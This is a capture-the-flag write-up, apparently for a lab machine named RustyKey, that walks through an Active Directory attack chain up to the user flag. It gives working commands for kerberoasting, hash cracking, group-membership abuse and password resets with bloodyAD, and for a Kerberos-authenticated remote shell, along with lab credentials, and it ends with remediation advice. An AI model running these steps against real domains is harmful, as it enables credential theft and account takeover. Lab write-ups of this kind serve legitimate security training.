## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Use ldapsearch for AD enumeration
- Learned that Netexec by default filters out machine accounts when kerberoasting because machine accounts normally have very strong passwords set by default. However, this is not always the case like here, and is kerberoastable/crackable.
- Found what security implementations the Protected Users group has by default (Stronger AES encryption on TGTs, disabling NTLM hash and caching credentials, TGTs expire in 4 hours, etc.)
- Learned that having AddMember privileges can also mean having RemoveMember rights. Also learned that one can remove not only users from groups, but groups from groups using bloodyAD
- Became familiar with using tools that don't rely on SMB and use Kerberos authentication (ldapsearch and bloodyAD -k vs net rpc)

## Walkthrough

1. Run nmap scan

2. Run bloodhound using given credentials `rr.parker:8#t5HE8L!W3A`

![image](https://github.com/user-attachments/assets/3874dc11-7171-4dd9-9f61-b3472efb00f8)

3. We get an error with LDAP saying it can't find dc.rustykey.htb so add that to `/etc/hosts` file and try again.

`sudo bloodhound-python -d rustykey.htb -u rr.parker -p "8#t5HE8L\!W3A" -ns 10.129.63.201 -c all`

4. With bloodhound, we find an initial path to user via nn.marcos

5. However, with rr.parker, there is no way to nn.marcos. After much enumeration and dead ends, we try kerberoasting to gain initial access. But we get no results for it

`nxc ldap dc.rustykey.htb -u rr.parker -p "8#t5HE8L\!W3A" -k --kerberoasting kerberoast.txt`

![image](https://github.com/user-attachments/assets/f06dbd5b-a301-42a9-9034-1a996a147349)

6. Running it again with the debug flag this time, we see that by default, nxc searches only for computers. We change the filter to look for users instead and try again.

7. Kerberoasting successful! We got a hash

![image](https://github.com/user-attachments/assets/e4d8528d-03cd-468e-bbde-3ae0a0f6c1df)

8. Crack offline with hashcat

`hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt`

9. Hash doesn't crack, so we try kerberoasting with a different method. First, enumerate all usernames with ldapsearch

`ldapsearch -x -H ldap://rustykey.htb -D 'rr.parker@rustykey.htb' -w '8#t5HE8L!W3A' -b "DC=rustykey,DC=htb" "(objectCategory=*)" sAMAccountName | grep '^sAMAccountName:' | cut -d' ' -f2 > accountList`

![image](https://github.com/user-attachments/assets/2f6787e2-1765-4f50-b0d9-c30819116bb2)

10. Then try kerberoasting using impacket's GetUserSPNs.py script using the `-usersfile` flag

`GetUserSPNs.py -usersfile accountList -request -k -dc-ip 10.129.244.92 -dc-host dc.rustykey.htb rustykey.htb/rr.parker:"8#t5HE8L\!W3A" -outputfile kerberoast.txt`

![image](https://github.com/user-attachments/assets/dd7e5e13-5d06-4055-b210-bd046e3d64da)

11. Kerberoasting is a success and we get back 17 hashes. Try cracking them offline once more using hashcat

`hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`

![image](https://github.com/user-attachments/assets/f791b6a7-ae86-412b-a5ed-ea7dbfe78616)

12. Got the password for machine account IT-Computer3$. Now, check bloodhound and see if there's a path to the machine with this account

![image](https://github.com/user-attachments/assets/61ed86ed-c04a-4ecc-8e1d-e017673e08d4)

13. Yes, there is! So our game plan now will be to add the IT-Computer3$ account to the Helpdesk group, which can change BB.Morgan's password. This will give us access to the DC.Rustykey.htb machine!

14. Add IT-Computer3$ to Helpdesk group via bloodyAD

`sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' add groupMember Helpdesk 'IT-Computer3$'`

![image](https://github.com/user-attachments/assets/bc7eb631-1379-4863-89ff-9d9dc105ffdf)

15. Tried changing bb.morgan's password and log in but can't because bb.morgan is part of the Protected Objects group. After looking at Bloodhound again, Helpdesk group has AddMember rights on Protected Objects so remove IT group from the protected group first.

`sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' remove groupMember 'Protected Objects' IT`

![image](https://github.com/user-attachments/assets/75bb0296-adce-4b05-bcb0-ee58d7393b6f)

16. Now change bb.morgan's password using IT-Computer3$'s creds

`sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' set password bb.morgan Password123`

17. Changed! Now we can request a Ticket Granting Ticket with bb.morgan's credentials using impacket's getTGT.py script

`getTGT.py -dc-ip dc.rustykey.htb rustykey.htb/bb.morgan:Password123`

18. Finally, add the path to the ticket to the KRB5CCNAME environment variable and log into the machine using evil-winrm with kerberos authentication

`evil-winrm -i dc.rustykey.htb -r rustykey.htb`

19. Got the user flag!!!

## Remediation Summary
- Follow Principle of Least Privilege! Users (even machine accounts) should not have more permissions than necessary
- Use strong, hard to guess passwords. For machine accounts, it's best to use the default AD configuration and have it set a strong password upon creation. If machine accounts must be manually created, make sure to adhere to strong password policy.
